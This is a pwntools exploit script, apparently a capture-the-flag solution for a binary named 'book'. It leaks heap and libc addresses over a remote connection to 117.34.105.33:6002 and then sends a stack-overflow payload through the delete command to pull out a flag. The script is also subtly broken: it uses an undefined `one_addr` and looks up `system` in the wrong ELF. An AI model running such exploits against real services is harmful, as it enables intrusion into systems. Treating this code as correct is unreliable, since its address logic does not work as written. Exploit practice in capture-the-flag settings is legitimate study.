from pwn import *
DEBUG=1
list = [ ]
if DEBUG:
    env = os.environ
    #nv["LD_PRELOAD"] = os.getcwd() + '/libc-2.23.so'
    context.log_level = 'debug'
    p = process("./book")

else:
    context.log_level = 'info'
    p = remote("117.34.105.33",6002)

libc = ELF('./libc-2.23.so')
elf = ELF("./book")

#get shell
def exp():
    p.recvuntil("Who")
    p.send('a' * 0x14)
    p.recvuntil('a' * 0x14)
    leak_heap_addr=u32(p.recv(4))
    leak_libc_addr=u32(p.recv(4))
    libc_base = leak_libc_addr - 0x1AA3C4
    #one_addr = libc_base + 0x3FD27
    system_addr = elf.symbol['system'] + libc_base 
    print hex(leak_libc_addr),hex(libc_base),hex(system_addr)

    pause()
    p.sendline("delete")
    p.recvuntil("----\n")
    #delete() stack overflow
    flag_addr = 0x8048870
    payload = 'a' * 0x1A + p32(one_addr)
    p.sendline(payload)
    p.recvuntil("----\n")
    p.recvuntil("----\n")
    flag = p.recvuntil("}")
    print flag

if __name__ == "__main__":
    exp()
